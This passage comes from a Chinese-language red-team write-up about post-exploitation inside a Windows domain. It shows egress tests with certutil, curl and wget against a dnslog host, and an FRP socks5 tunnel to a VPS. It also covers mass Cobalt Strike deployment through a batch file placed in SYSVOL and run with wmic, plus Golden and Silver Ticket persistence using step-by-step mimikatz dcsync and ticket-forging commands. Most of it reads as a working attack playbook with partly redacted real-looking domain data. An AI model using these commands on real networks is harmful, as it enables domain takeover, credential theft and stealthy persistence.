(1)ICMP 协议
执行命令`ping ip` ,执行成功则支持
(2)tcp协议
这个默认都支持吧,没啥好说的
(3)http协议
window下推荐
`shell certutil -urlcache -split -f http://k2wx21.dnslog.cn`
> ****Online****  
>  CertUtil: -URLCache command FAILED: 0x80072efd (WIN32: 12029)  
>  CertUtil: A connection with the server could not be established
window高版本及其linux
    1.curl k2w421.dnslog.cn
    2.wget k2w421.dnslog.cn
(4)dns协议
一般我也是直接ping如果可以解析域名说明dns是通的。
下面这两个操作建议你用自己的域名试试能不能解析即可。
window
`nslookup www.baidu.com @8.8.8.8`
linux
`dig @114.114.114.114 www.baidu.com`
这里书本介绍了一个有趣的情况,就是在常见的企业办公网段上网的场景，流量不能直接流出，需要使用内网中的代理服务器,这个其实有点类似于NAT的思想.
常用判断方法如下:
> 1.查看网络连接，判断是否存在于其他机器的8080(不绝对)等端口的连接
>
> 2.查看内网中是否有主机名类似于"proxy" 的机器
>
> 3.查看IE浏览器的直接代理
总体来说这种方法利用起来有一定的局限性。
回到我们的主题上,因为我的cs是http反弹回 来的，所以肯定是支持应用层http的协议的。
**2.利用FRP搭建稳定的socks5代理隧道**
VPS端:
    1.下载最新版frp的
    wget https://github.com/fatedier/frp/releases/download/v0.34.3/frp_0.34.3_linux_amd64.tar.gz
    2.解压
    tar -xzvf frp_0.34.3_linux_amd64.tar.gz 
    3.配置frps.ini
    [common]
    bind_port = 14500
    token = fuck0ox
    4.启动程序
     ./frps -c frps.ini
客户端:
    1.配置frpc.ini
    [common]
    server_addr = 101.x.x.x
    server_port = 14500
    token = fuck0ox
    tls_enable = true
    [http_proxy]
    type = tcp
    remote_port = 16005
    plugin = socks5
正常启动即可。
### 0x4.2 寻找靶标
上面我们已经通过一些小手段拿下了域控,并且做好了稳定网络，下面就开始我们的小旅程吧。
这个时候就可以放开点手脚啦,端口扫描之类的开起来。
可以先简单收集下80、8080端口,查看下内网存放的服务,有没有跟我们目标有关的。
`portscan 192.168.1.0/24 80,443,8080`
然后把开放的端口,丢进httpx快速扫描下，看看有没有相关的内容。
终端开个代理:
    export all_proxy=socks5://198.xx.xx.xx:16005
好像效果不是很行，最后还是上了`proxychains4`
开启httpx的扫描:
`cat target.txt | proxychains4 httpx -threads 10 -content-length -follow-redirects`
发现有很多用了Hikvision的摄像头,然后后面就是根据返回的数据包挑选一些站点来看看。
最终简单看了下一些站点:
还有一个呼叫中心的东西,整体来说这个内网还行吧。
...一般简单试了几个小弱口令,反正内网里面都很薄弱的啦。。。
...
关于怎么找自己的目标，这个就属于后渗透的技巧了，这个就是体力活了，没啥好写的，简单看看自己没啥好弄的，就此打住。
### 0x4.3 cs批量上线
关于这个批量上线,也就小型目标的时候好用点,大型目标不推荐，这样你的cs会直接死掉的。
操作比较简单，不多赘述。
1.通过下发GPO针对指定OU的机器和用户进行打击
2.通过域管账户批量执行命令即可。
3.上传木马到开放的UNC路径，或者放在sysol的域共享文件夹下。
4.cs的pth直接上线,不过当前域环境有部分机子存在卡巴斯基，所以服务直接被拦截了(后面有机会可以写写针对卡巴斯基的一些对抗想法)
...
这里简单演示下第3种思路吧。
上传到SYSVOL目录下:
`\\POXSXXVER\sysvol\poXpl.com\1.bat`
然后批量执行:
(2)wmic可以执行但是没有回显
`wmic /node:192.168.1.x process call create "cmd /c
\\POxxERVER\sysvol\poxpl.com\1.bat"`
`remote-exec wmi 192.168.1.x whoami`
CS上线的话只需要一个过掉卡巴斯基的马就行了,直接执行就ok了。
## 0x5 域环境权限维持
这里主要是根据书本第8章-权限维持分析及防御中的8.3节来扩展展开。
这里我只讲3个我比较感兴趣的,因为这三个我比较喜欢用啦,还有其他很多方式，不过我还没开始研究，后面如果有机会自己也可以写出来与各位交流下，共同寻找些比较有效的方式。
因为在渗透的过程中，我突然发现我用的域管账号pth失败，经过`net user itadmin /domain`发现
管理员登录然后修改了这个密码。这个时候下面两种方式能很好应对这种情况。
### 0x5.1 黄金票据
> 在域环境中，存在一个SID为502的域账号krbtgt。krbtgt是KDC服务使用的账号,属于Domain
> Admins组。在域环境中，每个用户的账号票据都是由krbtgt生成的，如果攻击者拿到了krbtgt的NTLM
> Hash或者AES-256的值,就可以伪造域内任意用户的身份，并以该用户的身份访问其服务。
使用域的Golden Ticket(黄金票据)进行票据传递攻击时,通常需要掌握以下信息:
  * 需要伪造的域管理员用户名
  * 完整的域名
  * 域SID
  * krbtgt的NTLM Hash或AES-256的值
**1.导出krbtgt的NTLM Hash**
`mimikatz @lsadump::dcsync /domain:pohpl.com /user:krbtgt`
2.获取域SID
`wmic useraccount get name,sid`
> Guest S-1-5-21-291403081-3947339614-192785736-501
>
> krbtgt S-1-5-21-291403081-3947339614-192785736-502
这里可以确定域的SID:`S-1-5-21-291403081-3947339614-192785736`
krbtgt的sid:`502`
3.查询域管理员账号
`net group "domain admins" /domain`
这里我选择伪造:`Aravind`
4.查询域名
`ipconfig /all`
获取到fqdn
5.查看当前票据并且清空
    1.klist
    2.klist purge
    3.mimikatz @kerberos::purge
6.生成票据
    mimikatz @kerberos::golden /admin:Aravind /domain:poxpl.com /sid:S-1-5-21-291403081-3947339614-192785736 /krbtgt:2cc650xxxxxxxxx568fe0f71b01ca /ticket:"Aravind.kiribi"
    其实用aes 256也可以:
    /krbtgt: -> /aes256:即可
执行完本地会生成一个`Aravind.kiribi`名字的文件
7.传递票据并注入内存
    mimikatz @kerberos::ptt Aravind.kiribi
8.检索当前会话中的票据
`mimikatz @kerberos::tgt`
这个时候就代表注入成功啦,后面可以去验证下，是否有访问域控制器的权限了。
### 0x5.2 白银票据
这个我用的其实比较少.还是介绍一下吧。
> Silver Ticket不用于Golden Ticket。Silver
> Ticket的利用过程是伪造TGS,通过已知的授权的服务密码生成一张可以访问该服务的TGT。因为在票据生成的过程中不需要使用KDC,所以可以绕过域控制器，很少留下日志。而Golden
> Ticket在利用过程中需要由kdc颁发TGT,并且在生成伪造的TGT的20分钟内,TGS不会对该TGT的真伪进行检验。
>
> Silver Ticket 依赖于服务账号的密码散列值，这不同于Golden Ticket利用需要使用krbtgt账号的密码散列值，因此更加隐蔽。
>
> Golden
> Ticket使用krbtgt账号的密码散列值，利用伪造的高权限的TGT向KDC要求颁发拥有任意服务器访问权限的票据，从而获取域控制器权限。而Silver
> Ticket会通过相应的服务账号来伪造TGS,例如LDAP、MSSQL、WinRM、DNS、CIFS等，范围有限，只能获取对应服务的权限。
>
> 黄金和白银最明显的区别就是:
>
> Golden Ticket是使用krbtgt账号hash加密的，而Silver Ticket是由特定的服务账号加密的。
攻击者在使用Silver Ticket对内网进行攻击时，需要掌握以下信息:
  * 域名
  * 域SID
  * 目标服务器的FQDN
  * 可利用的服务
  * 服务账号的NTLM Hash
  * 需要伪造的用户名
这里得说说服务账号的概念(我个人理解也不是很到位)
> 在域中，域用户可以提供服务，计算机账号也可以提供服务。因为域中的SPN只注册在用户(Users) 和
> 计算机(Computers)下，其中SPN是将服务实例与服务登录账户关联的。
>
> 查询所有服务账号:
>
> `setspn -T DOMAINNAME -F -Q */*`
下面演示下伪造CIFS的服务票据
> _Common Internet File System (CIFS) is a network filesystem protocol used
> for providing shared access to files and printers between machines on the
> network._
1.获取cifs的服务账户
`dcsync poXXl.com PXSERVER$`
> 18825f30f26d1b776be64aaae7fa8f27
2.清空票据
`klist purge`
3.伪造票据
    mimikatz @kerberos::golden /domain:poxl.com /sid:-1-5-21-291403081-3947339614-192785736 /target:POxxRVER.pohpl.com /service:cifs /rc4:18825f30f26d1b77xxx4aaae7fa8f27 /user:Aravind /ptt
4.验证权限
这个我尝试的时候发现并没有成功,可能是有其他kdc的签名验证之类,或者是机器的hash不对吧?(*)
后面我再本地再进行实验一下。
> 如果想修改成其他服务也很简单
>
> `/service:LDAP`
## 0x6 总结
不知不觉间,已经早上12点了,我睁开了惺忪的双眼，梦中的一切仿佛就是真实发生过一样。这个时候QQ弹起了来自默安的小伙伴@低危表演艺术家给我发的信息,"2021年了,你还是那么菜？",我才明白，菜才是最大的真实orz,以后还是要加强内网方面知识的学习。
## 0x7 参考链接
[Test-AdminAccess](https://powersploit.readthedocs.io/en/latest/Recon/Test-AdminAccess/)
[域攻击之精准定位特权用户](https://www.anquanke.com/post/id/94461)
[Abusing GPO Permissions](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
[域信息枚举](https://xz.aliyun.com/t/7724)
[SharpGPOAbuse](https://labs.f-secure.com/tools/sharpgpoabuse/)